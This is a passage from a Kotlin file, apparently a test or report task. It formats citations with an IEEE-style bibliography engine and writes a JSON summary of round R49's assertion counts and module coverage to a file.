                BibliographyCitationEngine.Style.IEEE,
            ).let { it.bodyWithCitations + "\n" + it.bibliographyEntries.joinToString("\n") },
        )

        val summaryJson = """
            {
              "round": "R49",
              "total_assertions": $assertions,
              "modules_covered": 50,
              "new_pure_jvm_kernels": 75,
              "touched_pure_jvm_engines": 3
            }
        """.trimIndent()
        Files.writeString(artDir.resolve("r49-summary.json"), summaryJson + "\n")
    }
}
